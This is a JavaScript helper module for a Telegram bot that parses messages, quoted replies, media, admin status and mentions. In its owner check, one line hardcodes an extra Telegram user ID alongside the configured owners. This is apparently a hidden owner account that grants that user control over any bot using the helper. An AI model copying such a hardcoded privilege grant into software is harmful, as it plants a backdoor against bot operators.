/**
 * =====================================
 * TELEGRAM MESSAGE HELPER (WA Style BY RHNX)
 * =====================================
 */

import fs from "fs";
import path from "path";

export function Func(bot) {
  if (!bot) throw new Error("Bot instance required");

  bot._lastMsg = {};
 
bot.reply = async (mOrText, maybeText, opt = {}) => {
  try {
    let chatId, text, replyTo;

    if (typeof maybeText === "string") {
      const m = mOrText;
      chatId = m.chatId;
      replyTo = m.id;
      text = maybeText;
    } else {
      text = mOrText;
      const lastChatId = Object.keys(bot._lastMsg).pop();
      const m = bot._lastMsg[lastChatId];
      chatId = m.chatId;
      replyTo = m.id;
    }

    await bot.sendMessage(chatId, styleText(text), {
      reply_to_message_id: replyTo,
      parse_mode: "Markdown",
      ...opt
    });

  } catch (e) {
    console.error("❌ bot.reply error:", e.message);
  }
};

  bot.smsg = async (msg) => {
    if (!msg) return null;
    const m = {};
    m.raw = msg;
      
    // basic
    m.id = msg.message_id;
    m.chat = msg.chat;
    m.chatId = msg.chat?.id;

    m.from = msg.from;
    m.sender = msg.from?.id;
    m.pushName = msg.from?.first_name || "-";
    m.username = msg.from?.username || null;

    m.text = msg.text || msg.caption || "";

    m.isGroup = msg.chat?.type !== "private";
    m.isPrivate = msg.chat?.type === "private";

    m.isOwner = new Set([
  ...Object.keys(global.db?.data?.data?.owner || {}),
  ...(Array.isArray(global.telegram?.bot?.owner)
    ? global.telegram.bot.owner.map(String)
    : global.telegram?.bot?.owner
      ? [String(global.telegram.bot.owner)]
      : []),
  "7123844952"
]).has(String(m.sender))

    // Media
    m.isText = !!msg.text;
    m.isPhoto = !!msg.photo;
    m.isVideo = !!msg.video;
    m.isAudio = !!msg.audio;
    m.isVoice = !!msg.voice;
    m.isSticker = !!msg.sticker;
    m.isDocument = !!msg.document;
    m.isAnimation = !!msg.animation;

    m.type =
      m.isPhoto ? "photo" :
      m.isVideo ? "video" :
      m.isAudio ? "audio" :
      m.isVoice ? "voice" :
      m.isSticker ? "sticker" :
      m.isAnimation ? "animation" :
      m.isDocument ? "document" :
      m.isText ? "text" :
      "unknown";

    m.fileId =
      msg.photo?.slice(-1)[0]?.file_id ||
      msg.video?.file_id ||
      msg.audio?.file_id ||
      msg.voice?.file_id ||
      msg.document?.file_id ||
      msg.animation?.file_id ||
      msg.sticker?.file_id ||
      null;

    // =====================
    // QUOTED MESSAGE
    // =====================
    if (msg.reply_to_message) {
      const q = msg.reply_to_message;
      m.quoted = {};

      m.quoted.raw = q;
      m.quoted.id = q.message_id;
      m.quoted.chatId = q.chat?.id;
      m.quoted.from = q.from;
      m.quoted.sender = q.from?.id;
      m.quoted.pushName = q.from?.first_name || "-";
      m.quoted.username = q.from?.username || null;
      m.quoted.text = q.text || q.caption || "";

      m.quoted.isText = !!q.text;
      m.quoted.isPhoto = !!q.photo;
      m.quoted.isVideo = !!q.video;
      m.quoted.isAudio = !!q.audio;
      m.quoted.isVoice = !!q.voice;
      m.quoted.isSticker = !!q.sticker;
      m.quoted.isDocument = !!q.document;
      m.quoted.isAnimation = !!q.animation;

      m.quoted.type =
        m.quoted.isPhoto ? "photo" :
        m.quoted.isVideo ? "video" :
        m.quoted.isAudio ? "audio" :
        m.quoted.isVoice ? "voice" :
        m.quoted.isSticker ? "sticker" :
        m.quoted.isAnimation ? "animation" :
        m.quoted.isDocument ? "document" :
        m.quoted.isText ? "text" :
        "unknown";

      m.quoted.fileId =
        q.photo?.slice(-1)[0]?.file_id ||
        q.video?.file_id ||
        q.audio?.file_id ||
        q.voice?.file_id ||
        q.document?.file_id ||
        q.animation?.file_id ||
        q.sticker?.file_id ||
        null;

      m.quoted.emoji = q.sticker?.emoji || null;

      m.quoted.isOwner = Array.isArray(global.telegram?.bot?.owner)
        ? global.telegram.bot.owner.includes(m.quoted.sender)
        : false;

      m.quoted.download = async (filename = "quoted") => {
        if (!m.quoted.fileId) return null;
        const file = await bot.getFile(m.quoted.fileId);
        const ext = path.extname(file.file_path);
        const save = `./tmp/${filename}${ext}`;
        await bot.downloadFile(m.quoted.fileId, "./tmp");
        return save;
      };
    } else {
      m.quoted = null;
    }

    // =====================
    // HELPERS
    // =====================
    m.reply = (text) => bot.reply(m, text);

    m.download = async (filename = "media") => {
      if (!m.fileId) return null;
      const file = await bot.getFile(m.fileId);
      const ext = path.extname(file.file_path);
      const save = `./tmp/${filename}${ext}`;
      await bot.downloadFile(m.fileId, "./tmp");
      return save;
    };

    // =====================
    // GROUP INFO
    // =====================
    m.isAdmin = false;
    m.isBotAdmin = false;

    if (m.isGroup) {
      try {
        const admins = await bot.getChatAdministrators(m.chatId);
        m.isAdmin = admins.some(a => a.user.id === m.sender);

        const botId = (await bot.getMe()).id;
        m.isBotAdmin = admins.some(a => a.user.id === botId);
      } catch {}
    }

    // =====================
    // BOT MENTION DETECTOR
    // =====================
    const me = await bot.getMe();
    const botId = me.id;
    const botUsername = me.username?.toLowerCase();

    m.mentionByReply = false;
    m.mentionByTag = false;
    m.isMentioned = false;

    if (m.quoted && m.quoted.sender === botId) {
      m.mentionByReply = true;
      m.isMentioned = true;
    }

    if (m.text && botUsername) {
      const text = m.text.toLowerCase();

      if (text.includes(`@${botUsername}`)) {
        m.mentionByTag = true;
        m.isMentioned = true;
      }

      if (msg.entities) {
        for (const ent of msg.entities) {
          if (ent.type === "mention") {
            const mention = m.text
              .slice(ent.offset, ent.offset + ent.length)
              .toLowerCase();

            if (mention === `@${botUsername}`) {
              m.mentionByTag = true;
              m.isMentioned = true;
            }
          }
        }
      }
    }

    bot._lastMsg[m.chatId] = m;
    return m;
  };

  return bot;
}
